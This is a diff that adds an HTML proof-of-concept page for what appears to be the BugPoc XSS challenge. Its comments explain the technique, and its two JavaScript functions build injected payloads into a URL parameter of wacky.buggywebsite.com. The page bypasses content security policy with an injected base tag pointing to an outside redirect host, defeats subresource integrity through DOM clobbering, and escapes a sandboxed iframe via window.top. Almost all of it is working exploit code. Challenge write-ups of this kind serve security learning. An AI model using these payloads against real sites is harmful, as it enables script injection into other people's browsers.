@@ -1,0 +1,38 @@
+<!DOCTYPE html>
+<html>
+    <head>
+        <title>XSS Poc : CSP/SRI/Sandbox Bypass</title>
+    </head>
+    <body>
+        <script>
+            // content-security-policy: script-src 'nonce-gyzyfhmynqlj' 'strict-dynamic'; frame-src 'self'; object-src 'none';
+            // TR;DL : XSS => CSP Bypass and SRI Bypass using the Dom Clobbering. And finally trigger a xss using the window.top.alert(1).
+            // First, I bypassed csp using the base tag.
+            // Second, I bypassed integrity value used in SRI(SubResource Integrity) using the Dom Clobbering.
+            // Why using the window.top? We should call the alert() method on the wintow.top and window.parent because Using the `sandbox allow-scripts allow-same-origin` in Child iframe. This is sandbox bypass.
+                       
+            const Dom_Clobbering = function () {
+                const payload = '</title><form><output id="fileIntegrity">Modified</output>';
+                const url = `https://wacky.buggywebsite.com/frame.html?param=${payload}`;
+
+                window.name = 'iframe';
+                window.location = url;
+            }
+
+            const exploit = function (){
+                const payload = '</title><BASE HREF="https://mfol4633a69b.redir.bugpoc.ninja"><form><output id="fileIntegrity">F0NfquGiAKFW0hvQsOmMsnAyVCjs3sjH0IyIf8wogAU=</output>';
+                const url = `https://wacky.buggywebsite.com/frame.html?param=${payload}`;
+
+                window.name = 'iframe';
+                window.location = url;
+            }
+        </script>
+
+        <h1>BugPoc XSS Challenge</h1>
+        <h3>If you click the button below and Enter the `console.log(fileIntegrity.value);` on the chrome console window, You can see that the hash value has been modified to 'Modified'</h3>
+        <input type='button' onclick= 'Dom_Clobbering()' value='Test'>
+
+        <h3>If you click the button below and execute poc code, You can trigger the xss.</h3>
+        <input type='button' onclick= 'exploit()' value='Trigger'>
+    </body>
+</html>
